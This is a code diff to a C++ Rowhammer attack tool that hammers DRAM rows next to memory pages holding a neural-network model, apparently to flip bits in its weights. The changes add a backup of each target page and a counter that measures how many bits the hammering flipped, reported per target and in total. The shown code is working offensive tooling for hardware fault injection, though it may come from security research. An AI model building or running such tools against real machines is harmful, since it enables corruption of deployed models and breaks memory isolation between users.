@@ -44,6 +44,7 @@ private:
     std::string attack_report_path;
     std::string patterns_file_path;
     int hammer_rounds;
+    int total_bit_flips;
     
     void* model_buffer = nullptr;
     size_t model_size = 0;
@@ -259,6 +260,10 @@ private:
         uint64_t victim_addr = (uint64_t)model_buffer + (target.dnn_page_id * PAGE_SIZE);
         const size_t ROW_SIZE = 8192;
         
+        // Create backup of target page before attack
+        std::vector<uint8_t> page_backup(PAGE_SIZE);
+        memcpy(page_backup.data(), (void*)victim_addr, PAGE_SIZE);
+        
         std::vector<volatile uint8_t*> aggressors;
         for (int row_offset : pattern.aggressor_rows) {
             uint64_t aggressor_addr = victim_addr + (row_offset * ROW_SIZE);
@@ -280,7 +285,27 @@ private:
         
         auto end_time = std::chrono::steady_clock::now();
         auto duration = std::chrono::duration_cast<std::chrono::seconds>(end_time - start_time);
+        
+        // Check for bit flips after attack
+        int bit_flips = count_bit_flips(page_backup.data(), (uint8_t*)victim_addr, PAGE_SIZE);
+        
         std::cout << "    Attack completed (" << duration.count() << "s)" << std::endl;
+        std::cout << "    Bit flips detected: " << bit_flips << std::endl;
+        
+        total_bit_flips += bit_flips;
+    }
+    
+    int count_bit_flips(const uint8_t* original, const uint8_t* current, size_t size) {
+        int total_flips = 0;
+        for (size_t i = 0; i < size; i++) {
+            uint8_t diff = original[i] ^ current[i];
+            // Count number of set bits in diff
+            while (diff) {
+                total_flips += diff & 1;
+                diff >>= 1;
+            }
+        }
+        return total_flips;
     }
     
     void execute_blacksmith_pattern(const std::vector<volatile uint8_t*>& aggressors, int total_activations) {
@@ -311,7 +336,7 @@ public:
     RowhammerAttack(const std::string& attack_report, const std::string& model, 
                     const std::string& patterns_file, int rounds)
         : attack_report_path(attack_report), model_path(model),
-          patterns_file_path(patterns_file), hammer_rounds(rounds) {}
+          patterns_file_path(patterns_file), hammer_rounds(rounds), total_bit_flips(0) {}
     
     ~RowhammerAttack() {
         if (pagemap_fd != -1) {
@@ -352,6 +377,7 @@ public:
         }
         
         std::cout << "\n[+] Attack completed: " << executed << " targets hammered" << std::endl;
+        std::cout << "[+] Total bit flips detected: " << total_bit_flips << std::endl;
         return true;
     }
     
